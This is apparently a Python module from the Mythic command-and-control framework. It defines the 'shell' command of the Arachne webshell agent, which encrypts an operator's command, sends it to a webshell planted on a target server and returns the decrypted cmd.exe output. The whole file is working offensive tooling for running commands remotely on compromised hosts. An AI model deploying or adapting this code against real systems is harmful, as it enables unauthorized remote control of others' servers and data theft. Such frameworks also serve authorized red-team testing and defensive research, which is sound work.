from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from arachne.WebshellRPC import WebshellRPC


class ShellArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(name="command",
                             type=ParameterType.String,
                             description="command and arguments to be executed")
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("command", self.command_line)
        else:
            raise ValueError("Missing command")


class ShellCommand(CommandBase):
    cmd = "shell"
    needs_admin = False
    help_cmd = "shell [command] [arguments]"
    description = "Execute commands through the use of cmd.exe"
    version = 2
    author = "@Airzero24"
    argument_class = ShellArguments
    attackmapping = []

    async def create_go_tasking(self,
                                taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=False,
            Completed=True,
            DisplayParams=taskData.args.get_arg("command")
        )
        message = "{}|{}|{}".format(taskData.Task.AgentTaskID,
                                    base64.b64encode(self.cmd.encode('UTF8')).decode(),
                                    base64.b64encode(taskData.args.get_arg("command").encode('UTF8')).decode())
        encrypted_resp = await SendMythicRPCCallbackEncryptBytes(MythicRPCCallbackEncryptBytesMessage(
            AgentCallbackUUID=taskData.Callback.AgentCallbackID,
            Message=message.encode(),
            IncludesUUID=False,
            IsBase64Encoded=False,
            C2Profile="webshell"
        ))
        if encrypted_resp.Success:
            try:
                response_data = await WebshellRPC.GetRequest(taskData.Payload.UUID,
                                                             encrypted_resp.Message,
                                                             taskData)
                if len(response_data) == 0:
                    taskData.args.set_manual_args(message)
                    response.Completed = False
                    response.Success = True
                    return response
                decrypted_resp = await SendMythicRPCCallbackDecryptBytes(MythicRPCCallbackDecryptBytesMessage(
                    AgentCallbackUUID=taskData.Callback.AgentCallbackID,
                    Message=response_data,
                    IncludesUUID=False,
                    IsBase64Encoded=True,
                    C2Profile="webshell"
                ))
                if decrypted_resp.Success:
                    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                        TaskID=taskData.Task.ID,
                        Response="|".join(decrypted_resp.Message.decode("UTF8").split("|")[1:]).encode("UTF8"),
                    ))
                    response.Success = True
                else:
                    response.TaskStatus = "error: decryption"
                    response.Error = decrypted_resp.Error
            except Exception as e:
                response.TaskStatus = "error: processing"
                response.Error = str(e)
        else:
            response.TaskStatus = "error: encryption"
            response.Error = encrypted_resp.Error
        if response.Error != "":
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=taskData.Task.ID,
                Response=response.Error.encode(),
            ))
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
            TaskID=task.Task.ID,
            Response=response.encode("UTF8"),
        ))
        return resp
